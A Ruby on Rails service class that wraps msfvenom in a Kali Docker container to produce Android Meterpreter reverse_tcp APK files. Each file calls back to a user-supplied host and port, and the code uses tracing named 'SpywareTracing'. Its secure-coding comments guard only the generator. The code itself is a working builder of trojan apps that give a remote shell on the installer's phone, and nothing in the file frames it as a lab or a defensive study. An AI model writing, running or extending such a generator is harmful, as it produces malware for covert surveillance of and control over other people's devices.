# frozen_string_literal: true

require 'open3'
require 'shellwords'

# SonarQube Rules Applied:
# - S2076: Command injection prevention
# - S108: Proper error handling
# - S1192: DRY - no duplicated strings
class PayloadGenerationService
  include MsfInstrumentation::ApplicationControllerMixin

  class GenerationError < StandardError; end

  # Whitelist of allowed payload types
  ALLOWED_PAYLOADS = %w[
    android/meterpreter/reverse_tcp
    android/meterpreter/reverse_https
  ].freeze

  CONTAINER_NAME = 'kali_container'
  MSF_OUTPUT_DIR = '/root/files/payloads'

  def initialize(apk_payload)
    @payload = apk_payload
    validate_payload!
  end

  def generate
    SpywareTracing.trace_apk_generation(@payload.name, @payload.destination_ip, @payload.destination_port) do |span|
      filename = sanitize_filename(@payload.name)
      msf_output_path = "#{MSF_OUTPUT_DIR}/#{filename}"
      rails_output_path = Rails.root.join('files', 'payloads', filename)
      
      ensure_output_directory!
      
      Rails.logger.info("🚀 Generating payload via Docker execution")
      Rails.logger.info("📍 IP: #{@payload.destination_ip}, Port: #{@payload.destination_port}")
      
      # SonarQube S2076: Use array form with Open3 - prevents shell injection
      command = build_msfvenom_command(msf_output_path)
      
      Rails.logger.debug("Command args: #{command.inspect}")
      
      stdout, stderr, status = Open3.capture3(*command)
      
      if status.success? && File.exist?(rails_output_path)
        Rails.logger.info("✅ Payload generated at #{rails_output_path}")
        span.set_attribute('generation.status', 'success')
        true
      else
        error_msg = stderr.presence || 'Unknown error'
        Rails.logger.error("❌ Payload generation failed: #{error_msg}")
        span.set_attribute('generation.status', 'failure')
        span.set_attribute('generation.error', error_msg)
        false
      end
    rescue StandardError => e
      SpywareTracing.record_error(span, e, 'generate_payload')
      Rails.logger.error("Error in payload generation: #{e.message}")
      false
    end
  end

  private

  # SonarQube S2076: Validate IP format to prevent injection
  def validate_payload!
    unless valid_ip?(@payload.destination_ip)
      raise GenerationError, "Invalid IP address format"
    end
    
    unless valid_port?(@payload.destination_port)
      raise GenerationError, "Invalid port number"
    end
  end

  def valid_ip?(ip)
    ip.to_s =~ /\A(\d{1,3}\.){3}\d{1,3}\z/ ||
      ip.to_s =~ /\A[a-zA-Z0-9\-_.]+\z/ # Allow hostnames too
  end

  def valid_port?(port)
    port.to_i.between?(1, 65535)
  end

  # SonarQube S2076: Sanitize filename to prevent path traversal
  def sanitize_filename(name)
    # Remove path separators and null bytes
    safe_name = name.to_s.gsub(/[\/\\:\0]/, '_')
    safe_name = safe_name.gsub(/\.\./, '_') # Prevent path traversal
    safe_name += '.apk' unless safe_name.end_with?('.apk')
    safe_name
  end

  def ensure_output_directory!
    FileUtils.mkdir_p(Rails.root.join('files', 'payloads'))
  end

  # Build command as array to prevent shell injection
  def build_msfvenom_command(output_path)
    [
      'docker', 'exec', '-u', '0', CONTAINER_NAME,
      'msfvenom', '-p', 'android/meterpreter/reverse_tcp',
      "LHOST=#{@payload.destination_ip}",
      "LPORT=#{@payload.destination_port.to_i}",
      '-o', output_path
    ]
  end
end
